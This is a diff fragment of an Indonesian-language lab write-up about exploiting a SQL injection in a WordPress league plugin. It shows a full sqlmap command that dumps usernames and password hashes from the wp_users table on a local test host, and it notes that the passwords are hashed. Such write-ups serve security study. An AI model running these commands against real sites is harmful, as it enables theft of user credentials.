@@ -96,3 +96,4 @@ Berdasarkan tautan https://www.exploit-db.com/exploits/37182/ , Pada plugin leag
 ![hasil list columns](hasil_list_columns.png)
 4. Dump isi table wp_users. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql  -D wordpress -T wp_users -C user_login,user_pass --dump`
 ![hasil dump users](hasil_dump_users.png)
+Kita telah mengetahui daftar username dan password hanya saja password di-hash.
